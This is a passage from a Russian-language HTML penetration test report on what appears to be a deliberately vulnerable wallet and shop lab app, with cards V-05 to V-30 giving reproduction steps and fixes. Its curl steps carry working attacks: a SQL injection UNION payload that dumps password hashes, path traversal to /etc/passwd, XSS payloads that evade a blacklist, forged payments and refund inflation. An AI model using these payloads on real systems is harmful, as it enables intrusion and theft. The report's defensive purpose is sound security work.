+  <div class="field"><b>Суть.</b> Фильтр по комментарию склеивается в <code>LIKE '%...%'</code>. UNION добавляет строки из <code>users</code> в выдачу сверки. Роль accountant берётся подделкой (V-02).</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_accounting.go — accountingReconcile()
+q = fmt.Sprintf(`SELECT id, kind, amount_kop, COALESCE(memo,''), status
+                 FROM operations WHERE memo LIKE '%%%s%%'`, memoFilter)</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Роль accountant/admin (подделка через V-02).</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>C='ow_session=ow.5.accountant.de1e7f93182cca1776b93f832b532a53510d4d891e95a3a42f4ff6cf2abafb74'
+curl -s -b "$C" --data-urlencode \
+ "memo=zzz%' UNION SELECT id, login, 0, password_hash, role FROM users-- -" \
+ http://localhost:18081/accounting/reconcile</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">6 bcrypt-хэшей</span> в таблице сверки.</div>
+  <div class="field"><b>Цепочки.</b> Текущая сверка фильтрует <code>memo</code> параметрами <code>$1/$2</code>. Отдельной стрелки к дампу хэшей нет.</div>
+  <div class="field"><b>Фикс.</b> Параметризовать фильтр (<code>$1</code>), не возвращать текст запроса/ошибки (V-05 в PATCHES).</div>
+</div>
+
+<!-- V-06 -->
+<div class="card">
+  <h3>V-06. Path traversal → чтение произвольных файлов <span class="sev high">High · CVSS 7.7</span></h3>
+  <div class="meta">A01:2021 · CWE-22 · PoC: <code>poc/kept/07_path_traversal.py</code></div>
+  <div class="field"><b>Суть.</b> Имя файла выписки чистится от <code>../</code> лишь однократно, поэтому оставшиеся последовательности доходят до <code>filepath.Join</code> и выводят за каталог экспорта.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_shop.go — statementExport()
+if strings.Contains(name, "..") { name = strings.Replace(name, "../", "", 1) }
+target := filepath.Join(s.cfg.ExportsDir, name)
+f, err := os.Open(target)</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Любая сессия.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>curl -s -b cj.txt -d "filename=../../../../../../etc/passwd" \
+     http://localhost:18081/statements/export</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Прочитаны</span> <code>/etc/passwd</code> и служебный <code>/var/www/labdata/stmt_note.txt</code> (код сверки <code>STMT-INV-118</code>).</div>
+  <div class="field"><b>Цепочки.</b> Текущий <code>statementExport</code> пишет CSV из операций пользователя и путь из формы не открывает. К V-03 не стыкуется.</div>
+  <div class="field"><b>Фикс.</b> <code>filepath.Base</code> + проверка <code>filepath.Rel</code> внутри каталога (V-06 в PATCHES).</div>
+</div>
+
+<!-- V-07 -->
+<div class="card">
+  <h3>V-07. Инфляция возврата заказа (refund = total × qty) <span class="sev high">High · CVSS 8.1</span></h3>
+  <div class="meta">A04:2021 · CWE-840, CWE-20 · OW-05 · PoC: <code>poc/kept/08_order_return_inflation.py</code>, <code>poc/stage_money.py</code></div>
+  <div class="field"><b>Суть.</b> Сумма возврата умножается на управляемый <code>qty</code> из формы. Большой <code>qty</code> печатает деньги. Отрицательный <code>qty</code> даёт отрицательное зачисление: баланс уменьшается, заказ всё равно помечается возвращённым, в <code>anomaly_log</code> пишется <code>return_neg</code>, проводка не отвергается.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_shop.go — orderReturn()
+qty, _ := strconv.Atoi(r.FormValue("qty"))
+refund := total
+if qty != 0 { refund = total * int64(qty) }
+s.db.Exec(`UPDATE users SET balance_kop = balance_kop + $1 WHERE id=$2`, refund, u.ID)</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Свой оплаченный заказ.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code># оформить заказ, затем:
+curl -s -b cj.txt -d "qty=1000" http://localhost:18081/orders/&lt;oid&gt;/return</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Прирост ≈ 269 730 ₽</span> на возврате заказа за 270 ₽ (×1000). В прогоне main тот же приём на заказе 450 ₽ с <code>qty=100</code> даёт +45 000 ₽, с <code>qty=-1</code> — −450 ₽.</div>
+  <div class="field"><b>Цепочки.</b> Самостоятельная. Заказ из V-29 имеет <code>total_kop = 0</code>, умножение его не обогащает. V-31 — отдельная гонка на заказе с ненулевой суммой. V-17 доступен только кассиру из БД.</div>
+  <div class="field"><b>Фикс.</b> Возврат только на фактически уплаченную сумму и однократно (V-07 в PATCHES).</div>
+</div>
+
+<!-- V-08 -->
+<div class="card">
+  <h3>V-08. Захват аккаунта через слабый сброс пароля <span class="sev high">High · CVSS 8.1</span></h3>
+  <div class="meta">A07:2021 · CWE-640, CWE-307, CWE-330 · PoC: <code>poc/kept/15_password_reset_ato.py</code></div>
+  <div class="field"><b>Суть.</b> Код сброса — 6 цифр, без лимита попыток и срока жизни, <code>rid</code> последователен; код виден админу в <code>/gateway/sms</code> и попадает по письму в публичный Mailpit (V-27). В связке с V-02 — детерминированный захват.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_auth.go — passwordReset()
+err := s.db.QueryRow(`SELECT user_id FROM password_resets
+  WHERE id=$1 AND sms_code=$2 AND used=FALSE ...`, rid, code).Scan(&uid)
+// нет expires_at, нет счётчика попыток, код 000000..999999</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Для детерминированного пути — admin-сессия (V-02); для анонимного — перебор 10⁶ без блокировки.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>curl -s -d "login=sidorov" http://localhost:18081/password/forgot
+# читаем код (admin-кука, V-02):
+curl -s -b "ow_session=ow.6.admin...." http://localhost:18081/gateway/sms
+curl -s -d "rid=&lt;rid&gt;&sms_code=&lt;code&gt;&password=Pwned123!" http://localhost:18081/password/reset</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Пароль жертвы сброшен, вход выполнен</span>; 25 неверных попыток подряд — без блокировки.</div>
+  <div class="field"><b>Цепочки.</b> Через поддельную admin-куку и Mailpit не идёт: шлюз SMS проверяет <code>IsAdmin()</code>, в письме кода нет. Остаётся перебор 6 цифр в окне 15 минут, без счётчика попыток.</div>
+  <div class="field"><b>Фикс.</b> Код из <code>crypto/rand</code>, срок жизни, лимит попыток, не показывать код; Mailpit не публиковать (V-08 в PATCHES).</div>
+</div>
+
+<!-- V-09 -->
+<div class="card">
+  <h3>V-09. Подделка платёжной подписи и переигровка платежа <span class="sev high">High · CVSS 8.1</span></h3>
+  <div class="meta">A02:2021 / A08:2021 · CWE-347, CWE-294 · PoC: <code>poc/kept/12_payment_replay_forge.py</code></div>
+  <div class="field"><b>Суть.</b> <code>/pay/replay</code> принимает <code>(op_id, amount_kop, recipient, sig)</code> и сверяет <code>sig</code> с <code>signPayment(...)</code>, ключ которого известен/утёк (V-01). Подпись подделывается для произвольного платежа.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_money.go — payReplay()
+expect := s.signPayment(opID, amount, recipient)
+if sig != expect { ... }   // ключ PAYMENT_KEY скомпрометирован
+s.db.Exec(`UPDATE users SET balance_kop = balance_kop - $1 WHERE id=$2`, amount, u.ID)</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Сессия (в связке с V-02 — сессия жертвы).</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>C='ow_session=ow.2.employee.bd7f7b95c272db10c976d34d764eb5d62f9025389b3d53baaddca0a6603e811a'
+SIG=71fe00b6b32896b1afd4c014ff592878a39e4e03d41346a403d2234dc0f2ea84
+curl -s -b "$C" -d "op_id=0&amount_kop=5000&recipient=1&sig=$SIG" http://localhost:18081/pay/replay</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Самоподписанный платёж принят</span>, средства списаны со счёта жертвы.</div>
+  <div class="field"><b>Цепочки.</b> Ключ из статики не нужен: <code>ReplaySig</code> уже в истории этого пользователя. Чужой счёт — только если запрос идёт с сессией жертвы (V-13/V-14 на том же сайте), не через подмену роли.</div>
+  <div class="field"><b>Фикс.</b> Сильный секрет только из хранилища; идемпотентность платежа; серверная авторизация суммы/получателя.</div>
+</div>
+
+<!-- V-10 -->
+<div class="card">
+  <h3>V-10. IDOR: просмотр чужого заказа <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A01:2021 · CWE-639 · PoC: <code>poc/kept/09_idor_order_view.py</code></div>
+  <div class="field"><b>Суть.</b> <code>orderView</code> отдаёт заказ по id без проверки владельца.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_shop.go — orderView(): нет условия user_id=текущий
+s.db.QueryRow(`SELECT user_id, status, total_kop, lines_json, ... FROM orders WHERE id=$1`, id)</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Любая сессия.</div>
+  <div class="field"><b>Шаги.</b> <pre class="sh"><code>curl -s -b cj.txt http://localhost:18081/orders/2</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Состав и сумма чужих заказов #1..#3</span>.</div>
+  <div class="field"><b>Цепочки.</b> В текущем <code>orderView</code> чужой заказ отдаётся только кассиру. Превью к захвату роли не ведёт.</div>
+  <div class="field"><b>Фикс.</b> Проверка владельца / 403 (V-10 в PATCHES).</div>
+</div>
+
+<!-- V-11 -->
+<div class="card">
+  <h3>V-11. IDOR: глобальная лента операций и предсказуемый grant <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A01:2021 · CWE-639, CWE-340 · PoC: <code>poc/kept/10_idor_ops_feed.py</code></div>
+  <div class="field"><b>Суть.</b> <code>/api/ops/feed</code> отдаёт операции всех пользователей и ставит <code>op_grant_&lt;id&gt;</code> с валидным токеном на каждую; <code>operation()</code> пускает по этому токену. Токен к тому же предсказуем (<code>signOpGrant</code> на утёкшем ключе).</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_money.go — apiOpsFeed(): SELECT ... FROM operations ORDER BY id DESC LIMIT 30
+http.SetCookie(w, &http.Cookie{Name: "op_grant_"+..., Value: it.T, ...})</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Любая сессия.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>curl -s -b cj.txt http://localhost:18081/api/ops/feed
+curl -s -b cj.txt "http://localhost:18081/operations/1?t=686ee15284020336c465b17b181c7160"</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Открыты все 9 операций</span> ленты (чужие в т.ч.).</div>
+  <div class="field"><b>Цепочки.</b> Самостоятельная: лента сама выдаёт grant на чужие операции. Утечка ключа не требуется. XSS (V-13/V-14) может унести эти grant, потому что у куки <code>op_grant_*</code> нет HttpOnly.</div>
+  <div class="field"><b>Фикс.</b> Лента только своих операций; grant не отдавать; ключ серверный (V-10/V-11 в PATCHES).</div>
+</div>
+
+<!-- V-12 -->
+<div class="card">
+  <h3>V-12. Утечка себестоимости и поставщиков через supply-channel <span class="sev med">Medium · CVSS 5.3</span></h3>
+  <div class="meta">A01:2021 / A04:2021 · CWE-200, CWE-922 · PoC: <code>poc/kept/11_supply_pricing_leak.py</code></div>
+  <div class="field"><b>Суть.</b> <code>/api/v2/supply/pricing</code> защищён заголовком <code>X-Wallet-Channel</code>, но сам канал (<code>supplyChannel</code> от <code>SESSION_KEY</code>) полностью отдаётся наружу: половина в <code>meta.ch_pref</code> тела <code>/api/catalog</code>, половина в заголовке <code>X-Wallet-Sync-Part</code>.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_shop.go — apiCatalog()
+meta["ch_pref"] = ch[:half]
+w.Header().Set("X-Wallet-Sync-Part", ch[half:])</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Любая сессия.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code># склеить ch_pref + X-Wallet-Sync-Part из /api/catalog, затем:
+curl -s -b cj.txt -H "X-Wallet-Channel: 377f2706b637319fc615" \
+     http://localhost:18081/api/v2/supply/pricing</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Себестоимость и заметки поставщиков</span> (COFFEE: цена 45000 / себестоимость 28000, «RoastLab…»).</div>
+  <div class="field"><b>Цепочки.</b> Самостоятельная. Канал режется пополам в теле и заголовке <code>/api/catalog</code>, ключ сессии из статики не участвует.</div>
+  <div class="field"><b>Фикс.</b> Не раскрывать канал; доступ к pricing — по роли, не по «секрету» в ответе.</div>
+</div>
+
+<!-- V-13 -->
+<div class="card">
+  <h3>V-13. Хранимая XSS в сообщении чаевых <span class="sev high">High · CVSS 7.1</span></h3>
+  <div class="meta">A03:2021 · CWE-79 · PoC: <code>poc/kept/14_stored_xss_tip.py</code></div>
+  <div class="field"><b>Суть.</b> Комментарий чаевых проходит самодельный блэклист и выводится как <code>TipHTML = template.HTML(memo)</code> без экранирования. Блэклист (<code>script/onerror/onload/onmouseover/javascript:</code>) обходится событием не из списка (<code>ontoggle</code>).</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_money.go — tipsReceived(): TipHTML: template.HTML(memo)
+// templates/tips_view.html: &lt;div class="tip-body"&gt;{{.TipHTML}}&lt;/div&gt;</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Отправитель и жертва-получатель чаевых.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>curl -s -b cj_sender.txt --data-urlencode \
+ 'comment=&lt;details open ontoggle=alert(document.cookie)&gt;pwn&lt;/details&gt;' \
+ -d "recipient=petrova&amount_rub=1" http://localhost:18081/tips/new
+# жертва открывает /tips/received?id=&lt;id&gt; -> скрипт исполняется</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Исполняемый HTML сохранён</span> и отдаётся получателю без экранирования.</div>
+  <div class="field"><b>Цепочки.</b> Скрипт на том же сайте ходит с кукой жертвы: V-09 и V-11. <code>ow_session</code> из JS не читается (<code>HttpOnly</code>), эскалации роли нет.</div>
+  <div class="field"><b>Фикс.</b> Не использовать <code>template.HTML</code> для пользовательских данных; удалить самописный санитайзер (V-13 в PATCHES).</div>
+</div>
+
+<!-- V-14 -->
+<div class="card">
+  <h3>V-14. Отражённая XSS в истории операций <span class="sev med">Medium · CVSS 6.1</span></h3>
+  <div class="meta">A03:2021 · CWE-79 · PoC: <code>poc/kept/13_reflected_xss.py</code></div>
+  <div class="field"><b>Суть.</b> Параметр <code>q</code> кладётся в <code>QRaw = template.HTML(sanitizeSearchDisplay(q))</code> и выводится без экранирования.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_money.go — history(): QRaw: template.HTML(sanitizeSearchDisplay(q))
+// templates/history.html: &lt;span&gt;{{.QRaw}}&lt;/span&gt;</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Жертва открывает подготовленную ссылку.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>curl -s -b cj.txt \
+ "http://localhost:18081/history?q=%3Cdetails%20open%20ontoggle%3Dalert(document.cookie)%3Epwn%3C/details%3E"</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Нагрузка отражается без экранирования</span>.</div>
+  <div class="field"><b>Цепочки.</b> Как V-13: действие от имени жертвы на этом сайте, без чтения <code>ow_session</code> и без смены роли.</div>
+  <div class="field"><b>Фикс.</b> Экранирование по умолчанию (V-13/V-14 в PATCHES).</div>
+</div>
+
+<!-- V-15 -->
+<div class="card">
+  <h3>V-15. Cookie сессии без HttpOnly/Secure <span class="sev med">Medium · CVSS 5.4</span></h3>
+  <div class="meta">A05:2021 · CWE-1004, CWE-614 · Артефакт: <code>artifacts/headers-login.txt</code></div>
+  <div class="field"><b>Суть.</b> <code>ow_session</code> ставится с <code>HttpOnly:false</code>, без <code>Secure</code> — куку читает JS и она ходит по HTTP.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// auth.go — setSession(): HttpOnly: false, (нет Secure), SameSite: Lax</code></pre></div>
+  <div class="field"><b>Шаги.</b> <pre class="sh"><code>curl -i -s -d "login=ivanov&password=workplace1" http://localhost:18081/login | grep -i set-cookie
+# Set-Cookie: ow_session=...; Path=/; SameSite=Lax   (нет HttpOnly, нет Secure)</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Подтверждено</span> отсутствие флагов.</div>
+  <div class="field"><b>Цепочки.</b> Для <code>ow_session</code> стрелка неверна: в <code>auth.go</code> сейчас <code>HttpOnly: true</code>. Без HttpOnly и без Secure остаётся <code>op_grant_*</code> (V-11). Этого мало для V-02.</div>
+  <div class="field"><b>Фикс.</b> <code>HttpOnly+Secure+SameSite=Strict</code> (V-01/V-15 в PATCHES).</div>
+</div>
+
+<!-- V-16 -->
+<div class="card">
+  <h3>V-16. TOCTOU в оформлении → недоплата <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A04:2021 · CWE-367</div>
+  <div class="field"><b>Суть.</b> Котировка фиксирует сумму, но <code>checkoutConfirm</code> списывает <code>total</code> из котировки, а заказ формирует по «живой» корзине. Добавив дорогие товары после котировки, платишь по старой (дешёвой) сумме.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_shop.go — checkoutConfirm(): charge total (из quote), lines = loadCart() (текущая корзина)</code></pre></div>
+  <div class="field"><b>Результат.</b> Расхождение фиксируется в <code>anomaly_log('quote_drift')</code>, но оплата всё равно проходит по заниженной сумме.</div>
+  <div class="field"><b>Фикс.</b> Пересчитывать по корзине на момент оплаты; отклонять при расхождении (V-16 в PATCHES).</div>
+</div>
+
+<!-- V-17 -->
+<div class="card">
+  <h3>V-17. Двойной возврат при выдаче кассиром <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A04:2021 · CWE-840</div>
+  <div class="field"><b>Суть.</b> Для заказа в статусе <code>received</code> «выдача» делает ещё один возврат средств (<code>refund</code>), т.е. деньги возвращаются дважды.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_accounting.go — cashierFulfill(): ветка status=="received" -> UPDATE balance += total + anomaly 'order_double'</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Роль cashier (подделка V-02).</div>
+  <div class="field"><b>Фикс.</b> Развести «выдачу» и «возврат»; запрет повторной компенсации (V-17 в PATCHES).</div>
+</div>
+
+<!-- V-18 -->
+<div class="card">
+  <h3>V-18. БД без TLS и пароль в коде/чарте <span class="sev high">High · CVSS 7.4</span></h3>
+  <div class="meta">A02:2021 / A05:2021 · CWE-319, CWE-798 · OW-34 · PoC: <code>poc/kept/02_default_db_creds.py</code>, <code>stage_access.py</code></div>
+  <div class="field"><b>Суть.</b> DSN по умолчанию — <code>postgres://wallet:wallet@db:5432/wallet?sslmode=disable</code>: пароль известен из репозитория, трафик к Postgres идёт без TLS. С этим логином из сети compose читаются хэши и переписываются <code>password_hash</code>, <code>balance_kop</code> и <code>role</code>.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// docker-compose.yml: DATABASE_URL и POSTGRES_PASSWORD=wallet, sslmode=disable
+// poc/02_default_db_creds.py — SELECT password_hash, UPDATE balance и role</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Вход в БД с wallet/wallet</span>, дамп хэшей, смена баланса и роли. В <code>stage_access.py</code> жертве копируется хэш известного пароля — после этого её логин открывается этим паролем.</div>
+  <div class="field"><b>Фикс.</b> <code>sslmode=verify-full</code>, пароль только из секрета, сеть БД не публиковать (V-18 в PATCHES, <code>fixes/docker-compose.hardened.yml</code>).</div>
+</div>
+
+<!-- V-19 -->
+<div class="card">
+  <h3>V-19. Контейнер под root и уязвимая база образа <span class="sev med">Medium · CVSS 6.0</span></h3>
+  <div class="meta">A05:2021 · CWE-250, CWE-1395 · Артефакт: <code>artifacts/trivy-image.txt</code>, <code>trivy-fs.txt</code></div>
+  <div class="field"><b>Суть.</b> В <code>app/Dockerfile</code> нет <code>USER</code> — процесс и, как показал V-03, выполнение команд идут под <code>uid=0(root)</code>. База <code>debian:bookworm-slim</code> несёт 39 CVE (38 HIGH, 1 CRITICAL).</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// app/Dockerfile: FROM debian:bookworm-slim; нет USER
+// Trivy DS-0002 (HIGH): Specify at least 1 USER command ...</code></pre></div>
+  <div class="field"><b>Фикс.</b> Непривилегированный <code>USER</code>, distroless-база (<code>fixes/Dockerfile.hardened</code>), securityContext (<code>fixes/k8s-securitycontext.yaml</code>).</div>
+</div>
+
+<!-- V-20 -->
+<div class="card">
+  <h3>V-20. SSRF к mock + фиксированная команда + журнал без роли <span class="sev med">Medium · CVSS 5.3</span></h3>
+  <div class="meta">A10:2021 · CWE-918, CWE-78, CWE-306</div>
+  <div class="field"><b>Суть.</b> <code>notifySettings/doNotify</code> ходит на заданный <code>notify_url</code> (ограничен хостом mock и путём <code>/hooks/</code>); при ответе с <code>ticket=</code> выполняется <code>sh -c "uname -a"</code> и пишется <code>ops.log</code>, который затем читает <code>/ops/journal</code> без проверки роли.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_money.go — notifySettings(): exec.Command("sh","-c","uname -a"); os.WriteFile(".../ops.log", ...)
+// handlers_accounting.go — opsJournal(): os.ReadFile("/app/exports/journal/ops.log") без роли</code></pre></div>
+  <div class="field"><b>Фикс.</b> Убрать <code>exec</code>; журнал — по роли; строгая валидация callback (V-03/V-20 в PATCHES).</div>
+</div>
+
+<!-- V-21 -->
+<div class="card">
+  <h3>V-21. Нет таймаутов сервера и лимита пула → DoS <span class="sev med">Medium · CVSS 5.3</span></h3>
+  <div class="meta">A05:2021 · CWE-400, CWE-770</div>
+  <div class="field"><b>Суть.</b> <code>ListenAndServe</code> поднимает сервер с нулевыми <code>ReadHeaderTimeout/ReadTimeout/WriteTimeout/IdleTimeout</code>; у <code>sql.DB</code> не задан <code>SetMaxOpenConns</code>. Медленные заголовки/тело исчерпывают дескрипторы и пул к Postgres.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// server.go — ListenAndServe(): http.ListenAndServe(addr, mux); нет Server{...Timeout}; нет db.SetMaxOpenConns</code></pre></div>
+  <div class="field"><b>Фикс.</b> Таймауты <code>http.Server</code> + лимиты пула (V-18/V-21 в PATCHES).</div>
+</div>
+
+<!-- V-22 -->
+<div class="card">
+  <h3>V-22. Нет security-заголовков → clickjacking и пр. <span class="sev low">Low · CVSS 4.3</span></h3>
+  <div class="meta">A05:2021 · CWE-1021, CWE-693 · Артефакт: <code>artifacts/headers-login.txt</code>, <code>nuclei.txt</code></div>
+  <div class="field"><b>Суть.</b> Ответы не содержат <code>Content-Security-Policy</code>, <code>X-Frame-Options</code>, <code>Strict-Transport-Security</code>, <code>X-Content-Type-Options</code>.</div>
+  <div class="field"><b>Шаги.</b> <pre class="sh"><code>curl -I -s http://localhost:18081/login   # перечисленных заголовков нет</code></pre></div>
+  <div class="field"><b>Фикс.</b> Добавить заголовки в <code>render.go</code>/ingress (V-13/V-22 в PATCHES).</div>
+</div>
+
+<!-- V-23 -->
+<div class="card">
+  <h3>V-23. Нет CSRF-защиты; смена состояния по GET <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A01:2021 · CWE-352</div>
+  <div class="field"><b>Суть.</b> Нет CSRF-токенов на изменяющих формах; <code>orderReceived</code> меняет статус заказа без проверки метода (срабатывает и по GET — пригодно для CSRF через <code>&lt;img&gt;</code>).</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_shop.go — orderReceived(): UPDATE orders SET status='received' без проверки r.Method</code></pre></div>
+  <div class="field"><b>Фикс.</b> CSRF-токен/Origin-проверка; изменяющие операции — только POST (V-23 в PATCHES).</div>
+</div>
+
+<!-- V-24 -->
+<div class="card">
+  <h3>V-24. Раскрытие ошибок СУБД пользователю <span class="sev low">Low · CVSS 4.3</span></h3>
+  <div class="meta">A05:2021 · CWE-209 · PoC: <code>poc/kept/17_info_disclosure_errors.py</code></div>
+  <div class="field"><b>Суть.</b> Сырой текст ошибки Postgres и SQL-запрос возвращаются в ответе (индикатор и усилитель SQLi).</div>
+  <div class="field"><b>Шаги.</b> <pre class="sh"><code>curl -s -b cj.txt -d "recipient=ivanov&amount_rub=not_a_number)&memo=x" http://localhost:18081/transfer/new</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">В ответе</span> <code>pq:</code>, <code>SELECT ... ::bigint</code>, <code>syntax error</code>.</div>
+  <div class="field"><b>Фикс.</b> Общие сообщения, детали — в лог (V-04/V-24 в PATCHES).</div>
+</div>
+
+<!-- V-25 -->
+<div class="card">
+  <h3>V-25. Перечисление пользователей <span class="sev low">Low · CVSS 4.3</span></h3>
+  <div class="meta">A01:2021 · CWE-200, CWE-307 · PoC: <code>poc/kept/16_user_enumeration.py</code></div>
+  <div class="field"><b>Суть.</b> <code>/api/recipients</code> отдаёт логины и имена всех пользователей (включая служебные роли) — готовый список целей для V-02/V-08.</div>
+  <div class="field"><b>Шаги.</b> <pre class="sh"><code>curl -s -b cj.txt http://localhost:18081/api/recipients</code></pre></div>
+  <div class="field"><b>Фикс.</b> Не раскрывать полный справочник; поиск по точному совпадению, по минимуму полей.</div>
+</div>
+
+<!-- V-26 -->
+<div class="card">
+  <h3>V-26. Секреты печатаются в логи CI <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A09:2021 · CWE-532</div>
+  <div class="field"><b>Суть.</b> <code>ci/app-credentials.sh</code> печатает <code>DB_PASSWORD</code>, <code>SESSION_KEY</code>, <code>PAYMENT_KEY</code> в лог job; в <code>.gitlab-ci.yml</code> формируется base64 docker-auth. Логи доступны участникам проекта.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// ci/app-credentials.sh: printf "%s=%s\n" "APP_SESSION_KEY" "$APP_SESSION_KEY" ...</code></pre></div>
+  <div class="field"><b>Фикс.</b> Не печатать секреты; masked/file-переменные CI (V-26 в PATCHES, <code>fixes/gitlab-ci.secure.yml</code>).</div>
+</div>
+
+<!-- V-27 -->
+<div class="card">
+  <h3>V-27. K8s без securityContext; публичный Mailpit <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A05:2021 · CWE-16, CWE-306 · Артефакт: <code>artifacts/trivy-fs.txt</code></div>
+  <div class="field"><b>Суть.</b> Деплойменты используют дефолтный securityContext (root, без <code>readOnlyRootFilesystem</code>, без seccomp, без лимитов). Mailpit публикуется отдельным Ingress без аутентификации — письма (в т.ч. ссылки сброса, V-08) доступны публично.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// Trivy: KSV-0014/0118/0104/0001/0012 на app.yaml, mail.yaml, mock.yaml, postgres.yaml
+// charts/.../ingress.yaml + values.yaml: mailIngress.enabled=true</code></pre></div>
+  <div class="field"><b>Фикс.</b> securityContext + лимиты (<code>fixes/k8s-securitycontext.yaml</code>); <code>mailIngress.enabled=false</code> или auth-proxy.</div>
+</div>
+
+<!-- V-28 -->
+<div class="card">
+  <h3>V-28. Уязвимые зависимости (SCA) <span class="sev med">Medium</span></h3>
+  <div class="meta">A06:2021 · CWE-1104, CWE-1395 · Артефакт: <code>artifacts/trivy-image.txt</code></div>
+  <div class="field"><b>Суть.</b> Образ несёт 39 CVE в пакетах ОС (в т.ч. <code>CVE-2023-45853</code> zlib — CRITICAL), а бинарь собран Go-stdlib <code>v1.22.12</code> с <code>CVE-2025-68121</code> (crypto/tls, CRITICAL).</div>
+  <div class="field"><b>Фикс.</b> Обновить базовый образ и Go-toolchain; гейтить <code>trivy image</code>/<code>govulncheck</code> в CI (<code>fixes/gitlab-ci.secure.yml</code>).</div>
+</div>
+
+<!-- V-29 -->
+<div class="card">
+  <h3>V-29. Переполнение чаевых на кассе → заказ за 0 <span class="sev high">High · CVSS 7.5</span></h3>
+  <div class="meta">A04:2021 · CWE-190 · OW-01 · PoC: <code>poc/stage_money.py</code></div>
+  <div class="field"><b>Суть.</b> <code>chargeKop</code> складывает сумму корзины и <code>tip_kop</code> в <code>int64</code>. Верхняя граница <code>tip_kop</code> переполняет сумму в отрицательное значение, проверка <code>chargeKop &lt; 0</code> обнуляет списание. Товар уходит, баланс не меняется.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_shop.go — checkoutQuote()
+tipKop, _ := strconv.ParseInt(r.FormValue("tip_kop"), 10, 64)
+chargeKop := dbSum - dbSum*int64(promoPct)/100 + tipKop
+if chargeKop &lt; 0 { chargeKop = 0 }</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Сессия сотрудника, непустая корзина.</div>
+  <div class="field"><b>Шаги.</b> Оформить котировку с <code>tip_kop</code> на границе <code>int64</code>, подтвердить её. В <code>checkout_quotes</code> <code>total_kop=0</code> при ненулевых чаевых.</div>
+  <div class="field"><b>Результат.</b> <span class="ok">Заказ оплачен нулём</span>, баланс до и после совпадает.</div>
+  <div class="field"><b>Цепочки.</b> На V-07 не продолжается: в котировку пишется <code>total_kop = 0</code>, возврат этого заказа нулевой. Связка была взята из <code>poc/stage_money.py</code> и на формуле возврата не сходится.</div>
+  <div class="field"><b>Фикс.</b> Считать сумму в <code>big.Int</code> или проверять переполнение до сложения; отклонять <code>tip_kop</code> вне разумного диапазона.</div>
+</div>
+
+<!-- V-30 -->
+<div class="card">
+  <h3>V-30. Гонка повторного использования котировки <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A04:2021 · CWE-362 · OW-03 · PoC: <code>poc/stage_registry_extra.py</code></div>
+  <div class="field"><b>Суть.</b> <code>checkoutConfirm</code> читает <code>used</code>, списывает баланс, ставит <code>used=TRUE</code> и создаёт заказ отдельными запросами, без транзакции. Несколько подтверждений одной котировки проходят окно до флага.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_shop.go — checkoutConfirm()
